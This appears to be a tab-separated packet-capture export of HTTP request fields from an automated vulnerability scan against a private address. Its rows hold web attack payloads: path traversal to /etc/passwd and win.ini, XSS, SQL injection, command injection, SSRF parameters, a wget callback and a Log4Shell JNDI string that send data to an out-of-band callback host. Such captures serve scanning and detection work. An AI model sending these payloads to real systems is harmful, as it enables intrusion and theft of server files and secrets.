http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/sap/public/bc/icf/logoff?redirecturl=https://example.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/sap/public/bc/icf/logoff?redirecturl=https://example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/password.cgi		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/password.cgi
	gzip																close		43	43	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/ispirit/interface/gateway.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/ispirit/interface/gateway.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rest/domains/list?sortCol=fullyQualifiedName&sortDir=asc		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/rest/domains/list?sortCol=fullyQualifiedName&sortDir=asc
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?s=/index/index/name/$%7B@phpinfo()%7D		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/index.php?s=/index/index/name/$%7B@phpinfo()%7D
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rest/api/2/projectCategory?maxResults=1000		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/rest/api/2/projectCategory?maxResults=1000
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://c8acjap9m8v98g1htghgcekcuceyyyyyr.oast.online		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://c8acjap9m8v98g1htghgcekcuceyyyyyr.oast.online
	gzip																close		140	140	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?u=http://c8acjap9m8v98g1htghgcekcuceyyyyyg.oast.online/&href=http://c8acjap9m8v98g1htghgcekcuceyyyyye.oast.online/&action=http://c8acjap9m8v98g1htghgcekcuceyyyyyk.oast.online/&host=c8acjap9m8v98g1htghgcekcuceyyyyyc.oast.online&http_host=c8acjap9m8v98g1htghgcekcuceyyyyyq.oast.online&email=root@c8acjap9m8v98g1htghgcekcuceyyyyyo.oast.online&url=http://c8acjap9m8v98g1htghgcekcuceyyyyy1.oast.online/&load=http://c8acjap9m8v98g1htghgcekcuceyyyyyw.oast.online/&preview=http://c8acjap9m8v98g1htghgcekcuceyyyyys.oast.online/&target=http://c8acjap9m8v98g1htghgcekcuceyyyyya.oast.online/&proxy=http://c8acjap9m8v98g1htghgcekcuceyyyyy4.oast.online/&from=http://c8acjap9m8v98g1htghgcekcuceyyyyyh.oast.online/&src=http://c8acjap9m8v98g1htghgcekcuceyyyyy6.oast.online/&ref=http://c8acjap9m8v98g1htghgcekcuceyyyyby.oast.online/&referrer=http://c8acjap9m8v98g1htghgcekcuceyyyybn.oast.online/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/?u=http://c8acjap9m8v98g1htghgcekcuceyyyyyg.oast.online/&href=http://c8acjap9m8v98g1htghgcekcuceyyyyye.oast.online/&action=http://c8acjap9m8v98g1htghgcekcuceyyyyyk.oast.online/&host=c8acjap9m8v98g1htghgcekcuceyyyyyc.oast.online&http_host=c8acjap9m8v98g1htghgcekcuceyyyyyq.oast.online&email=root@c8acjap9m8v98g1htghgcekcuceyyyyyo.oast.online&url=http://c8acjap9m8v98g1htghgcekcuceyyyyy1.oast.online/&load=http://c8acjap9m8v98g1htghgcekcuceyyyyyw.oast.online/&preview=http://c8acjap9m8v98g1htghgcekcuceyyyyys.oast.online/&target=http://c8acjap9m8v98g1htghgcekcuceyyyyya.oast.online/&proxy=http://c8acjap9m8v98g1htghgcekcuceyyyyy4.oast.online/&from=http://c8acjap9m8v98g1htghgcekcuceyyyyyh.oast.online/&src=http://c8acjap9m8v98g1htghgcekcuceyyyyy6.oast.online/&ref=http://c8acjap9m8v98g1htghgcekcuceyyyyby.oast.online/&referrer=http://c8acjap9m8v98g1htghgcekcuceyyyybn.oast.online/
	gzip																close				application/x-www-form-urlencoded;charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/guest_auth/poc.php?cmd=cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/guest_auth/poc.php?cmd=cat%20/etc/passwd
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/websso/SAML2/SSO/vsphere.local?SAMLRequest=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36		${jndi:${lower:d}n${lower:s}://${env:hostName}.c8acjap9m8v98g1htghgcekcuceyyyybg.oast.online}		/web/websso/SAML2/SSO/vsphere.local?SAMLRequest=
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/Visitor/bin/WebStrings.srf?file=&obj_name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/Visitor/bin/WebStrings.srf?file=&obj_name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/./../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/./../../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd
	gzip																close		161	161							192.168.1.104															1	http://192.168.1.104/web/images/..%2fapply_abstract.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/images/..%2fapply_abstract.cgi
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/eam/vib?id=/etc/issue		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/eam/vib?id=/etc/issue
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/index.php?plot=;wget%20http://c8acjap9m8v98g1htghgcekcuceyyyybe.oast.online		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/index.php?plot=;wget%20http://c8acjap9m8v98g1htghgcekcuceyyyybe.oast.online
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rest/api/2/screens		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/rest/api/2/screens
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/ultimate-member/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/wp-content/plugins/ultimate-member/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5(9999999999)))		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5(9999999999)))
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]=
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rest/api/2/resolution		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/rest/api/2/resolution
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)''		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)''
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/nextgen-gallery/nggallery.php?test-head=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/wp-content/plugins/nextgen-gallery/nggallery.php?test-head=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/blog/wp-content/plugins/1-flash-gallery/		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/blog/wp-content/plugins/1-flash-gallery/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/yyoa/ext/https/getSessionList.jsp?cmd=getAll		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/yyoa/ext/https/getSessionList.jsp?cmd=getAll
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/redirection/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/wp-content/plugins/redirection/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/uploads/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-content/uploads/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/sap/public/bc/icf/logoff?redirecturl=https://example.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/sap/public/bc/icf/logoff?redirecturl=https://example.com
	gzip																close		43	43	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/ispirit/interface/gateway.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/ispirit/interface/gateway.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/password.cgi		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/password.cgi
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini
*/*	gzip	en															close		21	21							192.168.1.104															1	http://192.168.1.104/web/debug.php		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/debug.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?s=/index/index/name/$%7B@phpinfo()%7D		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/index.php?s=/index/index/name/$%7B@phpinfo()%7D
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/users/sign_in		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/users/sign_in
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rest/api/2/projectCategory?maxResults=1000		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/rest/api/2/projectCategory?maxResults=1000
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://c8acjap9m8v98g1htghgcekcuceyyyyyr.oast.online		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://c8acjap9m8v98g1htghgcekcuceyyyyyr.oast.online
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/websso/SAML2/SSO/vsphere.local?SAMLRequest=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36		${jndi:${lower:d}n${lower:s}://${env:hostName}.c8acjap9m8v98g1htghgcekcuceyyyybg.oast.online}		/web/websso/SAML2/SSO/vsphere.local?SAMLRequest=
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/Visitor/bin/WebStrings.srf?file=&obj_name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/Visitor/bin/WebStrings.srf?file=&obj_name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
	gzip																close		161	161							192.168.1.104															1	http://192.168.1.104/web/images/..%2fapply_abstract.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/images/..%2fapply_abstract.cgi
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/./../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/./../../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rest/api/2/screens		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/rest/api/2/screens
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]=
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/NCFindWeb?service=IPreAlertConfigService&filename=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/NCFindWeb?service=IPreAlertConfigService&filename=
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/wp-content/themes/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean&file_path=/wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean&file_path=/wp-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/oliver/FileServlet?source=serverFile&fileName=c:/windows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/oliver/FileServlet?source=serverFile&fileName=c:/windows/win.ini
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/login.php/'%3E%3Csvg/onload=alert%6025SnmIcLC4GSscMcQ5BS8qEsUML%60%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/login.php/'%3E%3Csvg/onload=alert%6025SnmIcLC4GSscMcQ5BS8qEsUML%60%3E
